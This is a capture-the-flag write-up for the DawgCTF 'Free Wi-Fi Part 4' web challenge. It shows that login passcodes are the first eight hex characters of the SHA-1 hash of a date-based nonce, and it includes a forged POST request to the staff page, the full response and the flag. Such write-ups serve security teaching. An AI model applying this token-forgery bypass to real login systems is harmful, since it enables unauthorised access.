## Free Wi-Fi Part 4

* **Category:** web/networking
* **Points:** 250

### Challenge

> People seem to have some doohickey that lets them login with a code...
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Solution

Connecting to the web site, two interesting cookies are set:

```
Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMCAyMzo1Mg==; Path=/
Set-Cookie: WifiKey alg=SHA1; Path=/
```

Analyzing the [PCAP file](free-wifi.pcap), some POST requests passing `passcode` value can be found. Considering the SHA-1 algorithm discovered before in the cookie value and applying that algorithm to the wi-fi nonces captured, you will discover that `passcode` values are just the first 8 chars of the hashed `nonce` value.

```
#85
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMQ==  -> 2020-04-08 17:01
passcode=5004f47a
SHA-1(MjAyMC0wNC0wOCAxNzowMQ==) = 5004f47ae3e2e7c1c9a5ea4d1666f95e6b06b062

#217
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMg==  -> 2020-04-08 17:02
passcode=01c7aeb1
SHA-1(MjAyMC0wNC0wOCAxNzowMg==) = 01c7aeb11b1ee82035e9dc9e0292088d559921b1

#339
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMw==  -> 2020-04-08 17:03
passcode=097b3acf
SHA-1(MjAyMC0wNC0wOCAxNzowMw==) = 097b3acf84e6ed9e66f285cf3750b4ff89da48dc

#655
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzoxMw==  -> 2020-04-08 17:13
passcode=54f03ae2
SHA-1(MjAyMC0wNC0wOCAxNzoxMw==) = 54f03ae2cc8d1415bf06dec1670e03fd4e696982
```

The same process can be applied to your `nonce`.

```
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw== -> 2020-04-11 00:07
SHA-1(MjAyMC0wNC0xMSAwMDowNw==) = ef07d9f7a0f3cce235a644fbb8392f211025aa98
passcode=ef07d9f7
```

In order to perform a request.

```
POST /staff.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Origin: https://freewifi.ctf.umbccd.io
Connection: close
Referer: https://freewifi.ctf.umbccd.io/staff.html
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337
Upgrade-Insecure-Requests: 1

csrf_token=ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKKA.bAfOYEeMNYEl-nFUD9XT9rSH0YI&passcode=ef07d9f7&submit=Submit

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 11 Apr 2020 00:07:25 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw==; Path=/
Set-Cookie: WifiKey alg=SHA1; Path=/
Set-Cookie: JWT 'secret'="dawgCTF?heckin#bamboozle"; Path=/
Vary: Cookie
Content-Length: 2594

<!DOCTYPE html>
<html>
  <head>
    <title>
Staff Wifi Login Page
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Welcome to the staff login page!</h1>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">

        <h3 style="color:blue;">Staff login</h3>

      	<p>You may use either of the following methods to logon.</p>
	
	<div style="margin:15px;">

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKPQ.xW__Gp06GnXV1BdSSbKG-ZgPtyI">
  
    




<div class="form-group "><label class="control-label" for="username">Username:</label>
        
          <input class="form-control" id="username" name="username" type="text" value="">
        
  </div>


    




<div class="form-group "><label class="control-label" for="password">Password:</label>
        
          <input class="form-control" id="password" name="password" type="password" value="">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

      	<br/>

      	<p><a href="forgotpassword.html">Forgot your password?</a></p>

      	<h3> OR </h3>

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKPQ.xW__Gp06GnXV1BdSSbKG-ZgPtyI">
  
    






<div class="form-group  required"><label class="control-label" for="passcode">Login with WifiKey:</label>
        
          <input class="form-control" id="passcode" name="passcode" required type="text" value="ef07d9f7">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

	</div>

      </div>

      	<p class="space-above"><strong>DawgCTF{k3y_b@s3d_l0g1n!}</strong></p>

    </div>
  </div>
</div>



    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

The flag is the following.

```
DawgCTF{k3y_b@s3d_l0g1n!}
```